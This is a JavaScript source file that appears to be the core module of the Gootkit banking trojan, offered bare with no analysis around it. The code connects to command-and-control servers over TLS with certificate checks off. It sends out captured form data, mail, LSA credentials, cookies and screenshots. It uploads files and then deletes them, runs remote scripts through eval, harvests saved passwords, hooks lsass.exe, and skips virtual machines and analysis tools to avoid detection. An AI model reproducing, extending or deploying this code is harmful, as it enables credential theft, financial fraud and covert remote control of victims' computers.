



var spyware = require("spyware");
var saved_creds = require("saved_creds");

var fs = require('fs');
var tls = require('tls'); 
var zlib = require('zlib');
var net = require('net');
var stream = require('stream');
var util = require('util');
var module = require('module');
var clienthttp = require('clienthttp');
var suspend = require('suspend');
var pp = require('packet');
var config_processor = require("config_processor");

process.bIsDebugVersion = false;
process.g_vendorName = (process.env['vendor_id'] || 'unknown');

process.externalAddress = '0.0.0.0';
process.pendingMessages = [];
process.g_servers = []; 
 
if('_BODY_VERSION_STRING_HERE_' !== process.bodyVersion){
    process.g_botId = process.bodyVersion; 
}else{
    process.g_botId = '8.666.jet';
}

process.g_mainProcess = 'explorer.exe';
if(!util.isUndefined(process.env['mainprocessoverride'])){
	process.g_mainProcess = process.env['mainprocessoverride'].toLowerCase();
}


 
if(!util.isUndefined(process.env['issdb'])){
	process.g_botId += '.sdb';
}

process.addServer = function (host, port) {
	
	for(var i = 0; i < process.g_servers.length; i ++)
	{
		if(
			process.g_servers[i].host === host && 
			process.g_servers[i].port === port
		){
			return;
		}
	}

	process.g_servers.push({
		'host': host,
		'port': port || 7011
	});
}



var bDelevel = true;

if(process.defaultDomains.length > 10)
{
    process.defaultDomains.split("|").forEach(function(domain){
        process.addServer(domain, 443);
    });
}else{
    
    
}



const P_FRAGMENT_DELIVERY = 0xFFFE;
const P_FRAGMENT = 0xFFFF;
const FRAGMENT_LENGTH = 65000;

const P_SOCKS = 0;
const P_PING = 1;
const P_FS = 2;
const P_REGISTRATION = 3;
const P_SPYWARE = 4;
const P_CMDTERM = 5;

var packetParsers = {};
var procolPacketBuilders = {};
var protocolDispatchers = {};

protocolDispatchers[P_SOCKS] = 'client_proto_socks';
protocolDispatchers[P_PING] = 'client_proto_ping';
protocolDispatchers[P_FS] = 'client_proto_fs';
protocolDispatchers[P_REGISTRATION] = 'client_proto_registration';
protocolDispatchers[P_SPYWARE] = 'client_proto_spyware';
protocolDispatchers[P_CMDTERM] = 'client_proto_cmdterm';

for (let i in protocolDispatchers) {
	
	

	protocolDispatchers[i] = require(protocolDispatchers[i]);
	protocolDispatchers[i].register(
		i, packetParsers, procolPacketBuilders);
}


process.md5 = function (str) {
	return crypto.createHash('md5').update(str).digest("hex");
}

function BuildPacket(requestId, status, data) {
	var packet;

	if (data) {
		packet = new Buffer(
			2 +
			4 + 
			1 + 
			data.length
		);
	}
	else {
		packet = new Buffer(
			2 +
			4 + 
			1   
		);
	}

	packet.writeUInt16BE(MyPacketId, 0);
	packet.writeUInt32BE(requestId, 2);
	packet.writeUInt8(status, 6);

	if (data)
		data.copy(packet, 7);

	return packet;
}

function getRandomArbitrary(min, max) {
	return Math.floor(Math.random() * (max - min) + min);
}

function getRandomInt() {
	return getRandomArbitrary(0, 0xffffffff);
}



function ConnectToControlServerTCP(server, onDisconnectCallback)
{
	var isServerAlive = false;

	var bot = tls.connect(server.port, server.host, {rejectUnauthorized : false}, function() {

	    process.currentServer = server.host;

		var outstream = new pp.PacketCompiler();
		var instream = new pp.PacketSplitter();
		
		outstream.botSocket = bot;
		bot.lastServerPacket = new Date();
		instream.lastServerPacket = new Date();
		instream.lastServerPacket.setDate(instream.lastServerPacket.getDate() - 1);

		function sendPending() {    

		    process.pendingMessages.forEach(function(pkt){
		        try{
		            
		            switch(pkt.t){
		                case SLAVE_PACKET_FORM: 
		                case SLAVE_PACKET_MAIL:
		                case SLAVE_PACKET_LSAAUTH :
		                case SLAVE_PACKET_LOGLINE:
		                    process.controllerConnection
                            .sendProtocolPacket(P_SPYWARE, 
                                pkt.t, 0, pkt.p);
		                    break;
		                case SLAVE_PACKET_COOKIE:
		                    process.emit('browser_cookies', 
                                JSON.parse(pkt.p.toString()));
		                    break;
		                default :
		                    break;
		            }
		        }catch(e){

		        }
		    
		    });
		    process.pendingMessages = [];
		}

		bot.checkInteval = setInterval(function(){
			var dif = (
				new Date().getTime() - 
				(instream.lastServerPacket.getTime())
			);

			if(dif > (process.defaultPingTimerValue * 2)){
			    
			    bot.destroy();
			    clearInterval(bot.checkInteval);
			}
		}, 1000);

		outstream.pipe(bot);
		bot.pipe(instream);

		bot.on('drain', function(){
			outstream.emit('drain');
		})

		instream.pendingFragments = {};
		outstream.awaiters = {};

		instream.on('packet', function(data){
			
			instream.lastServerPacket = new Date();

			isServerAlive = true;

			if(data.length >= 2){

				let packetType = data.readUInt16BE(0);
				
				

				if(typeof(packetParsers[packetType]) !== 'undefined')
				{
					packetParsers[packetType](
						outstream, data.slice(2));
				}
			}
		});

		instream.on('error', function(error){
		    
			bot.destroy();
		});

		outstream.on('error', function(error){
		    
			bot.destroy();
		});

		outstream.writeAndWait = function(data, waiterCookie, callback)
		{
			outstream.awaiters[waiterCookie] = function(error, peerdata)
			{
				outstream.awaiters[waiterCookie] = undefined;   
				callback(error, peerdata);
			};

			outstream.write(data);
		}

		outstream.pushFileToServer = function(filename, requestId, removeAfterSend){
		
			fs.stat(filename, function(error, stat){
				
				if(error){
					return outstream.sendProtocolPacket(
						P_FS, requestId, 
						0xFE, new Buffer(error.message));
				}
				
				let fileDesc = new Buffer(4 + 2 + filename.length + 4);
				let uploadUUID = getRandomInt();
				fileDesc.fill(0);
				
				fileDesc.writeUInt32BE(stat.size, 0);
				
				fileDesc.writeUInt16BE(filename.length, 0 + 4);
				
				fileDesc.write(filename, 0 + 4 + 2, filename.length);
				
				fileDesc.writeUInt32BE(uploadUUID, 0 + 4 + 2 + filename.length);

				outstream.sendProtocolPacket(
					P_FS, requestId, 0x00, fileDesc);

				var bigfile2 = fs.createReadStream(filename, {'bufferSize': 2048});
		
				bigfile2.on('data', function(data){
					
					
					if(outstream.sendProtocolPacket(P_FS, requestId, 0x00, data) === false){
						bigfile2.pause();

						outstream.once('drain', function(){
							setTimeout(function(){
								bigfile2.resume();    
							}, 20);
							
						});

					}
				});


				bigfile2.on('end', function(){

					fileDesc.writeUInt32BE(0xDEADBEEF, 0 + 4 + 2 + filename.length);

					outstream.sendProtocolPacket(
						P_FS, requestId, 0, fileDesc);

					bigfile2.close();

					if(removeAfterSend){
					    fs.unlink(filename, function(){});
					}
				});
				
			});
		}

		outstream.sendProtocolPacket = function(type, requestId){
			
		    

			Array.prototype.shift.apply(arguments);
			instream.lastServerPacket = new Date();
			var packetBuffer = 
				procolPacketBuilders[type].apply(this, arguments);

			return outstream.write(packetBuffer);
		}

		process.controllerConnection = outstream;
		process.controllerConnection.socket = bot;

		setInterval(function(){
		    sendPending();
		}, 1000);


	});

	bot.on('close', function() {
	    
	    
        
	    for (let i in protocolDispatchers) {
	        if(protocolDispatchers[i].on_disconnect){
	            protocolDispatchers[i].on_disconnect();
	        }
	    }
	    onDisconnectCallback(undefined, isServerAlive);
	});


	bot.on('error', function(error) {
	    
	});
}

function IsInternetConnectionAvailiable(server, callback)
{
	var strResult = "DISCONNECTED";
    	
	clienthttp.get(util.format("https://%s:80/200", server.host), function(error, response){

		if(error)
		{
		    var errorMessage = error.message || error;

		    if(errorMessage.indexOf("ENOTFOUND") !== -1 || errorMessage.indexOf("server return")){
		        return callback(null, "ENOTFOUND");
		    }else{
		        return callback(null, "DISCONNECTED");
		    }
		}else{
		    if(util.isNull(response) || util.isUndefined(response)){
		        return callback(null, "DISCONNECTED");
		    }

		    if(util.isNull(response.headers) || util.isUndefined(response.headers)){
		        return callback(null, "DISCONNECTED");
		    }

		    if(util.isNull(response.headers['x-ssl-client-verify']) || 
                util.isUndefined(response.headers['x-ssl-client-verify'])){
		        return callback(null, "ENOTFOUND");
		    }

		    if(net.isIP(response.headers['x-ssl-client-verify']) !== 4){
		        return callback(null, "ENOTFOUND");
		    }

		    process.externalAddress = 
                response.headers['x-ssl-client-verify'];

		    return callback(null, "CONNECTED");
		}
	});
}

    
    
    
    

process.LoadDomainsFromRegistry = function(){
	var domains = process.RegReadObjectEncrypted("{f61905f0-0c02-481c-90d1-198bf27e56a1}");
	if(!util.isUndefined(domains)){
		if(Object.prototype.toString.call( domains ) !== '[object Array]'){
			return;
		}

		if(domains.length > 0){
			for(let i = 0; i < domains.length; i ++){
				if(domains[i].hasOwnProperty('host') === false){
					return;
				}

				if(domains[i].hasOwnProperty('port') === false){
					return;
				}
			}
		}
		process.g_servers = domains;
	}
}

process.SaveDomainsToRegistry = function(){
	process.RegWriteObjectEncrypted("{f61905f0-0c02-481c-90d1-198bf27e56a1}", process.g_servers);
}

function IsSuspProcess()
{

    if(process.env['trustedcomp'] === 'true')
    {
        return false;
    }


    var spyware = process.binding("spyware");
    var processesDump = spyware.SpGetProcessList();
    var vmx_detection = require("vmx_detection");

    for(let i = 0; i < processesDump.length; i ++)
    {
        if(processesDump[i].szExeFile){
            var name = processesDump[i].szExeFile.toLowerCase();
            if(name === 'pythonw.exe' || name === 'pos_trigger.exe')
            {
                return true;
            }
        }
    }

    if(process.env['USERDOMAIN'].toUpperCase() === '7SILVIA'){
        return true;
    }

    if(vmx_detection.IsVirtualMachine()){
        return true;
    }

    return false;
}

var InitializeMainProcess = suspend(function*()
{
	while(true)
	{

	    
	    
        
		

	    if(IsSuspProcess())
	    {
	        return;
	    }

		for(let i = 0; i < process.g_servers.length; i ++)
		{
			for(let k = 0; k < 20; k ++)
			{
			    var strResult = "UNKNOWN";
			    try
			    {
			        
			        strResult = yield IsInternetConnectionAvailiable(process.g_servers[i], suspend.resume());
			        
			        if(strResult == "ENOTFOUND"){
			            k = 22;
			        }else if(strResult == "CONNECTED"){
			            process.isUpdatePending = false;
			            var isServerAlive = yield ConnectToControlServerTCP(process.g_servers[i], suspend.resume());            
			            if(isServerAlive)
			            {
			                if(process.g_shutdownPending !== true)
			                {
			                    if(bDelevel){
			                        yield sleep(1000, suspend.resume()); 
			                    }else{
			                        yield sleep(20000, suspend.resume()); 
			                    }

			                    k = 0;
			                    continue;
			                }
			                else
			                {
			                    return;
			                }
			            }
			        }

			        if(bDelevel){
			            yield sleep(1000, suspend.resume()); 
			        }else{
			            yield sleep(2 * 60000, suspend.resume()); 
			        }
			    }catch(e){
			        yield sleep(1000, suspend.resume()); 
			    }

			}            
		}

		if(bDelevel){
			yield sleep(1000, suspend.resume()); 
		}else{
			yield sleep(10000, suspend.resume()); 
		}
	}
});

function GetSlavePort()
{
	var botIdHash = process.md5('GootkitLocalServer_' + process.g_botId);
	var portNumber = parseInt(botIdHash.substr(-4), 16);
	if(portNumber < 2000)
	{
		portNumber += 2000;
	}
	
	return portNumber;
}

process.OnDefaultJs = function(defaultjs)
{
	if(!util.isUndefined(process.slaveServer)){
		process.slaveServer.broadcastProtocolPacket(
			SLAVE_PACKET_DEFAULTJS, 
					new Buffer(defaultjs));
	}
}

process.OnPrivateJs = function(defaultjs)
{
	if(!util.isUndefined(process.slaveServer)){
		process.slaveServer.broadcastProtocolPacket(
			SLAVE_PACKET_PRIVATEJS, 
					new Buffer(defaultjs));
	}
}

process.OnSpConfig = function(config)
{
	if(!util.isUndefined(process.slaveServer)){
		process.slaveServer.broadcastProtocolPacket(
			SLAVE_PACKET_SPCONFIG, 
					new Buffer(JSON.stringify(config)));
	}
}


function processPacket(botSocket, packetType, packetBody, rawPacket)
{
	switch(packetType)
	{

		case SLAVE_PACKET_URLNOTIFICATION :
			

			process.emit('browser_navigate', 
                packetBody.toString());

			if(!util.isUndefined(process.slaveServer)){
				process.slaveServer.broadcastProtocolPacket(
					SLAVE_PACKET_URLNOTIFICATION, 
					packetBody);
			}
			break;
		case SLAVE_PACKET_DEFAULTJS : 
			process.g_defaultJs = packetBody.toString();
			try
			{
				eval(process.g_defaultJs);
			}
			catch(exception)
			{
				
			}

			break;
		case SLAVE_PACKET_PROCESS_PROP:
			botSocket.process = JSON.parse(packetBody.toString());
			break;
		case SLAVE_PACKET_SPCONFIG : 
			try
			{
			    process.g_scfg = JSON.parse(packetBody.toString());    				
			}
			catch(exception)
			{
				
			}

			
			break;
		case SLAVE_PACKET_PRIVATEJS : 
			try
			{
			    process.g_privateScript = packetBody.toString();
				eval(process.g_privateScript);
			}
			catch(exception)
			{
				
			}

			break;
		case SLAVE_PACKET_UPDATE :
			process.doUpdateBody(packetBody);
			break;
	    case SLAVE_PACKET_FORM: 
	    case SLAVE_PACKET_MAIL:
		case SLAVE_PACKET_LSAAUTH :
	    case SLAVE_PACKET_LOGLINE:
	        if(process.controllerConnection)
			{
				process.controllerConnection
					.sendProtocolPacket(P_SPYWARE, 
						packetType, 0, packetBody);
			}
			break;
	    case SLAVE_PACKET_COOKIE:
	        process.emit('browser_cookies', 
                JSON.parse(packetBody.toString()));
	        break;
	    case SLAVE_PACKET_API_TAKESCREEN :
	        if(process.controllerConnection)
	        {
	            var opts = JSON.parse(packetBody.toString());
	            var defaultFilename = 'SpTakeScreenshot_' + new Date().toUTCString().replace(/\:|\s+|\,/g, '_') + '.jpg';
	            var quality = opts.quality || 30;
	            var filename = opts.filename || defaultFilename;
	            var tmpFileName = path.join(process.env['temp'], filename);

	            function dummy(){}

	            var screen = spyware.SpTakeScreenshot(parseInt(quality));
	            fs.writeFile(tmpFileName, screen, function (error) {
	                if (error) {
	                    process.log('SLAVE_PACKET_API_TAKESCREEN', error.message);
	                } else {
	                    process.uploadLocalFile(tmpFileName, dummy);
	                    setTimeout(function () {
	                        fs.unlink(tmpFileName, dummy)
	                    }, 2 * 60000);
	                }
	            });
	        }
		default:

			
			if(process.controllerConnection){
				process.controllerConnection.write(rawPacket);
			}else{
				if(typeof(packetParsers[packetType]) !== 'undefined')
				{
					
					packetParsers[packetType](
						process.masterConnection, packetBody);
				}
			}
			break;
	}
}

var StartLocalServer = function()
{   
	process.slaveServer = net.createServer(function(botSocket) 
	{
		var outstream = new pp.PacketCompiler();
		var instream = new pp.PacketSplitter();

		outstream.pipe(botSocket);
		botSocket.pipe(instream);
		
		instream.botSocket = botSocket;
		outstream.botSocket = botSocket;
		outstream.socket = botSocket;

		process.slaveServer.clients.push(outstream);

		instream.on('packet', function(data)
		{
			if(data.length >= 2)
			{
			    try{
				    let packetType = data.readUInt16BE(0);
				    let packetBody = data.slice(2);
			        processPacket(botSocket, packetType, packetBody, data);
			    }catch(exception){
			        
			    }
			}
		});

		
		
		botSocket.on('end', function() 
		{
			process.slaveServer.clients.remove(outstream);
		});

		botSocket.on('error', function() 
		{
			process.slaveServer.clients.remove(outstream);
		});


		outstream.sendProtocolPacket = function(type, data, cb){
			
			
			var packet;

			packet = new Buffer(data.length + 2);
			packet.writeUInt16BE(type, 0);
			data.copy(packet, 2);
			
			outstream.write(packet, function(){
				if(!util.isUndefined(cb)) cb(null, null);
			});
		}

		if(process.g_defaultJs)
			outstream.sendProtocolPacket(SLAVE_PACKET_DEFAULTJS, 
				new Buffer(process.g_defaultJs));

		if(process.g_privateScript)
			outstream.sendProtocolPacket(SLAVE_PACKET_PRIVATEJS, 
				new Buffer(process.g_privateScript));

		if(process.g_scfg)
			outstream.sendProtocolPacket(SLAVE_PACKET_SPCONFIG, 
				new Buffer(JSON.stringify(process.g_scfg)));
	});

	process.slaveServer.clients = [];

	process.slaveServer.broadcastProtocolPacket = suspend(function*(type, data, cb)
	{
		
		var clients = process.slaveServer.clients;
		for(let i = 0 ; i < clients.length; i ++)
		{
			yield clients[i].sendProtocolPacket(
				type, data, suspend.resume());
		};

		
		if(!util.isUndefined(cb))
		{
			cb();
		}
	});

	process.slaveServer.listen(GetSlavePort(), '127.0.0.1');
};

var ConnectToLocalServer = function()
{
	var masterConnection = new net.Socket();

	masterConnection.connect(GetSlavePort(), function() {

		

		var outstream = new pp.PacketCompiler();
		var instream = new pp.PacketSplitter();

		outstream.pipe(masterConnection);
		masterConnection.pipe(instream);

		instream.pendingFragments = {};
		outstream.awaiters = {};

		instream.on('packet', function(data)
		{
			try{
				if(data.length >= 2)
				{
					var packetType = data.readUInt16BE(0);
					var packetBody = data.slice(2);

					
					
					
				    try{
				        processPacket(masterConnection, packetType, packetBody);
				    }catch(exception){
				        
				    }
				}
			}catch(ex){
				
				
			}
		});

		outstream.sendProtocolPacket = function(type, data){
		    
			var packetBuffer;
			if(!util.isUndefined( procolPacketBuilders[type]))
			{
				Array.prototype.shift.apply(arguments);
				packetBuffer = 
					procolPacketBuilders[type].apply(this, arguments);
			}
			else
			{
				packetBuffer = new Buffer(data.length + 2);
				packetBuffer.writeUInt16BE(type, 0);
				data.copy(packetBuffer, 2);
			}
			
			outstream.write(packetBuffer);
			
		}

		outstream.sendProtocolPacket(
			SLAVE_PACKET_PROCESS_PROP, 
			new Buffer(JSON.stringify({pid : process.pid, name : process.execPath})));
		
		process.masterConnection = outstream;
		process.masterConnection.socket = masterConnection;
		process.pendingMessages.forEach(function(pkt){
		    
			outstream.sendProtocolPacket(
				pkt.t, 
				pkt.p
			);
		});
		process.pendingMessages = [];

	});

	masterConnection.on('error', function()
	{
		
		
	});

	masterConnection.on('close', function()
	{
		
	    
	    setTimeout(function(){
	        process.terminateSelf();
	    }, 2 * 60000);
	})

	function reconnect()
	{
		if(process.g_shutdownPending !== true){
			setTimeout(ConnectToLocalServer, 1000);
		}
	}
}


function InitializeFilWatcher(injpath){
    
    
    var fs = require('fs');

    if(fs.existsSync(injpath)){
        try{
            process.g_scfg = JSON.parse(fs.readFileSync(injpath).toString());
            process.OnSpConfig(process.g_scfg);
        }catch(e){
            
        }

        fs.watchFile(injpath, function (curr, prev) {
            
            

            try{
                process.g_scfg = JSON.parse(fs.readFileSync(injpath).toString());
                process.OnSpConfig(process.g_scfg);
            }catch(e){
                
            }

        });
    }
}

exports.run = function (iter) {       
	
    

	process.superPool = setInterval(function(){}, 1000);
	process.GetMachineGuid();

	if(process.currentBinary === process.g_mainProcess){
	    
	    spyware.PregenerateCertificate();
	    StartLocalServer();
	    
	    process.collectSavedPasswords();
	    process.collectCookies();
	    
	    if(process.bIsDebugVersion){
	        InitializeFilWatcher("C:\\injects.json");
	    }
	    
	    InitializeMainProcess();
	    
	} else if(process.currentBinary === 'lsass.exe'){
	    spyware.SpHookLsa();
	    ConnectToLocalServer();
	} else {
	    ConnectToLocalServer();
	    process.collectSavedPasswords();
	    if(process.bIsDebugVersion){
	        spyware.SpStartHttpIntercepting();
	    }
	}
}



